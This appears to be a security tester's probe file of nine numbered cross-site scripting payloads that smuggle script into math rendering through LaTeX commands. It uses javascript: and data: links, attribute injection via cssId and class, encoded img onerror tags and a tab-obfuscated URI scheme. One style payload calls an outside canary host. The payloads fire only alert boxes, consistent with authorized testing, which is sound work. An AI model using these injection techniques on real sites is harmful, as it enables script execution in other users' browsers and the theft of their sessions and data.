# MATH-XSS-PROBE

P1 href-js: $\href{javascript:alert(document.domain)}{P1CLICK}$

P2 href-data: $\href{data:text/html,<script>alert(2)</script>}{P2CLICK}$

P3 cssId: $\cssId{x" onmouseover="alert(3)}{P3HOVER}$

P4 class: $x\class{y" onclick="alert(4)}{z}$

P5 style-csp: $\style{background:url(https://CANARYMATH7h3x.example/s)}{P5}$

P6 unicode: $\unicode{x3C}img/src/onerror=alert(6)\unicode{x3E}$

P7 block href:

$$\href{javascript:alert(7)}{P7BLOCK}$$

P8 texttt: $\texttt{<img src=x onerror=alert(8)>}$

P9 href-vbtab: $\href{javascript&#09;:alert(9)}{P9}$
